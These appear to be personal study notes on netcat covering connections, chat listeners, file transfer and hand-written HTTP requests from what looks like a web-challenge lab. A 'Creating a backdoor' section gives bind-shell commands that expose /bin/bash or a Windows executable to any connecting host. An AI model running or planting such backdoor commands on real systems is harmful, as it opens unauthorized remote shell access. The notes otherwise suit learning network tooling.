
Utility tool that uses UDP and TCP connections to read and write in a network. It can be used for both attacking and security

Can debug network

Runs on all OS

**help command**
`nc -h`

**Connecting to a server**
Syntax: 
`nc Target IP Address Target Port   
`nc 192.168.17.43 21`

#### man page
https://linux.die.net/man/1/nc


### chatting
Can allow users to chat. First must establish connection

#### create listener
`nc -lvvp 4444`

[-l]: Listen Mode 
[vv]: Verbose Mode {It can be used once, but we use twice to be more verbose} 
[p]: Local Port

#### create initiator
This is the one that will connect to the listener. Use the same port etc

`nc 192.168.1.35 4444`

### Creating a backdoor

#### Linux system
`nc -l -p 2222 -e /bin/bash`

#### Windows system
`nc -l -p 1337 -e hack.exe`

This will open a listener on the system that will pipe the command shell or the Linux bash shell to the connecting system.   
`nc 192.168.1.35 2222`


### Save output to desktop

`nc 192.168.17.43 21 -v -o /root/Desktop/Result.txt`


### File transfer

For example - Transfer from windows to kali
`nc -v -w 20 -p 8888 -l file.txt`
-w timeout option
-l listen mode

### http request with NC
hacker@talking-web~level2:~$ nc 127.0.0.1 80
GET / HTTP/1.1
Host:127.0.0.1

#### http request with nc with param
nc 127.0.0.1 80
GET /?a=7fa7fdf7ff50a6f375561b704fefdda5 HTTP/1.1
### URL Encoding with NC
echo -e "GET /6d338058%20c3daa354/37e9d9f8%20fb28ad7d HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80

